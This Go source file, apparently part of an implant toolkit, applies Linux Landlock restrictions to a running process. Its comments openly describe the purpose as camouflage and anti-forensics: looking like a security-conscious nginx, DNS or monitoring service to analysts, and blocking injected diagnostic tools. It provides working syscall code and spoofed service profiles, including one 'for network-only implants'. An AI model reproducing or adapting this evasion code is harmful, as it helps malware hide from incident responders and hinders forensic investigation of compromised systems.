package stealth

// Landlock Self-Sandboxing — Camouflage as Security-Conscious Service
//
// OPSEC rationale: Landlock is Linux's unprivileged sandboxing mechanism
// (like seccomp for filesystem access). By applying Landlock restrictions
// that match our cover identity, we achieve two goals:
//
//   1. CAMOUFLAGE: Analysts inspecting our process see Landlock restrictions
//      consistent with a properly sandboxed service. A process with Landlock
//      looks like it was written by security-aware developers — reducing
//      suspicion dramatically.
//
//   2. ANTI-FORENSICS: Landlock restrictions block forensic child processes.
//      If an analyst manages to inject a diagnostic tool into our process
//      (or we fork a shell by accident), the child inherits our Landlock
//      policy and cannot access the broader filesystem.
//
// Example profiles:
//   - "web server": read /var/www, /etc/ssl; write /var/log/nginx
//   - "DNS resolver": read /etc/resolv.conf; net access only
//   - "monitoring agent": read /proc, /sys; write /var/log/monitoring
//
// Landlock is inherited by all children and CANNOT be removed once applied.
// Choose the profile carefully — it restricts US too.
//
// Capability: None (Landlock is unprivileged by design)
// Kernel: 5.13+ (Landlock ABI v1), 5.19+ (ABI v2, adds file refer)
//
// Detection:
//   - /proc/[pid]/status shows "NoNewPrivs: 1" (required for Landlock)
//   - /proc/[pid]/attr/current may show Landlock context (kernel dependent)
//   - The restrictions themselves are not easily enumerable from outside

import (
	"fmt"
	"syscall"
	"unsafe"
)

// Landlock syscall numbers (x86_64).
const (
	sysLandlockCreateRuleset = 444 // __NR_landlock_create_ruleset
	sysLandlockAddRule       = 445 // __NR_landlock_add_rule
	sysLandlockRestrictSelf  = 446 // __NR_landlock_restrict_self

	// Landlock access rights for files (ABI v1)
	landlockAccessFSExecute    = 1 << 0
	landlockAccessFSWriteFile  = 1 << 1
	landlockAccessFSReadFile   = 1 << 2
	landlockAccessFSReadDir    = 1 << 3
	landlockAccessFSRemoveDir  = 1 << 4
	landlockAccessFSRemoveFile = 1 << 5
	landlockAccessFSMakeChar   = 1 << 6
	landlockAccessFSMakeDir    = 1 << 7
	landlockAccessFSMakeReg    = 1 << 8
	landlockAccessFSMakeSock   = 1 << 9
	landlockAccessFSMakeFifo   = 1 << 10
	landlockAccessFSMakeBlock  = 1 << 11
	landlockAccessFSMakeSym    = 1 << 12
	landlockAccessFSRefer      = 1 << 13 // ABI v2 (5.19+)

	// Rule type
	landlockRulePathBeneath = 1

	// Convenience combined access masks
	landlockAccessFSRead  = landlockAccessFSReadFile | landlockAccessFSReadDir
	landlockAccessFSWrite = landlockAccessFSWriteFile | landlockAccessFSMakeReg |
		landlockAccessFSRemoveFile | landlockAccessFSRemoveDir | landlockAccessFSMakeDir
	landlockAccessFSAll = landlockAccessFSExecute | landlockAccessFSWriteFile |
		landlockAccessFSReadFile | landlockAccessFSReadDir |
		landlockAccessFSRemoveDir | landlockAccessFSRemoveFile |
		landlockAccessFSMakeChar | landlockAccessFSMakeDir |
		landlockAccessFSMakeReg | landlockAccessFSMakeSock |
		landlockAccessFSMakeFifo | landlockAccessFSMakeBlock |
		landlockAccessFSMakeSym
)

// landlockRulesetAttr is the kernel's landlock_ruleset_attr struct.
type landlockRulesetAttr struct {
	handledAccessFS uint64
}

// landlockPathBeneathAttr is the kernel's landlock_path_beneath_attr struct.
type landlockPathBeneathAttr struct {
	allowedAccess uint64
	parentFD      int32
	pad0          int32
}

// LandlockRule describes a filesystem access rule.
type LandlockRule struct {
	Path   string // filesystem path to allow
	Access uint64 // bitmask of allowed operations
}

// LandlockProfile is a named set of filesystem access rules.
type LandlockProfile struct {
	Name  string
	Rules []LandlockRule
}

// Pre-built profiles that match common legitimate services.
var (
	// ProfileWebServer looks like nginx/apache.
	ProfileWebServer = LandlockProfile{
		Name: "web-server",
		Rules: []LandlockRule{
			{"/var/www", landlockAccessFSRead | landlockAccessFSExecute},
			{"/etc/ssl", landlockAccessFSRead},
			{"/etc/nginx", landlockAccessFSRead},
			{"/var/log/nginx", landlockAccessFSWrite | landlockAccessFSRead},
			{"/usr/lib", landlockAccessFSRead | landlockAccessFSExecute},
			{"/lib", landlockAccessFSRead | landlockAccessFSExecute},
			{"/tmp", landlockAccessFSRead | landlockAccessFSWrite},
		},
	}

	// ProfileDNSResolver looks like a DNS caching daemon.
	ProfileDNSResolver = LandlockProfile{
		Name: "dns-resolver",
		Rules: []LandlockRule{
			{"/etc/resolv.conf", landlockAccessFSRead},
			{"/etc/hosts", landlockAccessFSRead},
			{"/etc/nsswitch.conf", landlockAccessFSRead},
			{"/var/cache/dns", landlockAccessFSRead | landlockAccessFSWrite},
			{"/usr/lib", landlockAccessFSRead | landlockAccessFSExecute},
			{"/lib", landlockAccessFSRead | landlockAccessFSExecute},
		},
	}

	// ProfileMonitorAgent looks like a monitoring/metrics collector.
	ProfileMonitorAgent = LandlockProfile{
		Name: "monitor-agent",
		Rules: []LandlockRule{
			{"/proc", landlockAccessFSRead},
			{"/sys", landlockAccessFSRead},
			{"/etc/hostname", landlockAccessFSRead},
			{"/etc/os-release", landlockAccessFSRead},
			{"/var/log/monitoring", landlockAccessFSRead | landlockAccessFSWrite},
			{"/usr/lib", landlockAccessFSRead | landlockAccessFSExecute},
			{"/lib", landlockAccessFSRead | landlockAccessFSExecute},
			{"/tmp", landlockAccessFSRead | landlockAccessFSWrite},
		},
	}

	// ProfileMinimal is the most restrictive — only basic runtime libs.
	// Good for network-only implants that don't need filesystem access.
	ProfileMinimal = LandlockProfile{
		Name: "minimal",
		Rules: []LandlockRule{
			{"/usr/lib", landlockAccessFSRead | landlockAccessFSExecute},
			{"/lib", landlockAccessFSRead | landlockAccessFSExecute},
			{"/etc/resolv.conf", landlockAccessFSRead},
			{"/etc/hosts", landlockAccessFSRead},
		},
	}
)

// ApplyLandlock applies a Landlock policy to the current process.
// Once applied, it CANNOT be removed. All child processes inherit it.
// The process must set PR_SET_NO_NEW_PRIVS first (done automatically).
func ApplyLandlock(profile LandlockProfile) error {
	// Step 1: Set no_new_privs (required for Landlock)
	_, _, errno := syscall.Syscall6(
		syscall.SYS_PRCTL,
		38, // PR_SET_NO_NEW_PRIVS
		1,
		0, 0, 0, 0,
	)
	if errno != 0 {
		return fmt.Errorf("PR_SET_NO_NEW_PRIVS: %v", errno)
	}

	// Step 2: Create a Landlock ruleset
	rulesetAttr := landlockRulesetAttr{
		handledAccessFS: landlockAccessFSAll,
	}

	rulesetFD, _, errno := syscall.Syscall(
		sysLandlockCreateRuleset,
		uintptr(unsafe.Pointer(&rulesetAttr)),
		unsafe.Sizeof(rulesetAttr),
		0, // flags
	)
	if errno != 0 {
		return fmt.Errorf("landlock_create_ruleset: %v", errno)
	}
	defer syscall.Close(int(rulesetFD))

	// Step 3: Add rules for each allowed path
	for _, rule := range profile.Rules {
		if err := addLandlockRule(int(rulesetFD), rule); err != nil {
			// Non-fatal: path may not exist on this system
			continue
		}
	}

	// Step 4: Enforce the ruleset
	_, _, errno = syscall.Syscall(
		sysLandlockRestrictSelf,
		rulesetFD,
		0, // flags
		0,
	)
	if errno != 0 {
		return fmt.Errorf("landlock_restrict_self: %v", errno)
	}

	return nil
}

// ApplyCustomLandlock applies a custom set of rules without using a pre-built profile.
func ApplyCustomLandlock(rules []LandlockRule) error {
	return ApplyLandlock(LandlockProfile{
		Name:  "custom",
		Rules: rules,
	})
}

// addLandlockRule adds a single path rule to a Landlock ruleset.
func addLandlockRule(rulesetFD int, rule LandlockRule) error {
	// Open the path with O_PATH (no access check, just get a reference)
	pathBytes := []byte(rule.Path + "\x00")
	fd, _, errno := syscall.Syscall6(
		syscall.SYS_OPENAT,
		uintptr(0xffffffffffffff9c), // AT_FDCWD (-100 as unsigned)
		uintptr(unsafe.Pointer(&pathBytes[0])),
		0x200000|syscall.O_RDONLY, // O_PATH | O_RDONLY
		0, 0, 0,
	)
	if errno != 0 {
		return fmt.Errorf("open %s: %v", rule.Path, errno)
	}
	defer syscall.Close(int(fd))

	pathAttr := landlockPathBeneathAttr{
		allowedAccess: rule.Access,
		parentFD:      int32(fd),
	}

	_, _, errno = syscall.Syscall(
		sysLandlockAddRule,
		uintptr(rulesetFD),
		landlockRulePathBeneath,
		uintptr(unsafe.Pointer(&pathAttr)),
	)
	if errno != 0 {
		return fmt.Errorf("landlock_add_rule %s: %v", rule.Path, errno)
	}

	return nil
}

// LandlockAvailable checks if Landlock is supported by the running kernel.
func LandlockAvailable() bool {
	// landlock_create_ruleset with NULL attr and size 0 and
	// LANDLOCK_CREATE_RULESET_VERSION flag returns the ABI version.
	ver, _, errno := syscall.Syscall(
		sysLandlockCreateRuleset,
		0, // NULL attr
		0, // size 0
		1, // LANDLOCK_CREATE_RULESET_VERSION
	)
	if errno != 0 {
		return false
	}
	return ver >= 1
}

// LandlockABIVersion returns the Landlock ABI version supported by the kernel.
// Returns 0 if Landlock is not available.
func LandlockABIVersion() int {
	ver, _, errno := syscall.Syscall(
		sysLandlockCreateRuleset,
		0,
		0,
		1, // LANDLOCK_CREATE_RULESET_VERSION
	)
	if errno != 0 {
		return 0
	}
	return int(ver)
}
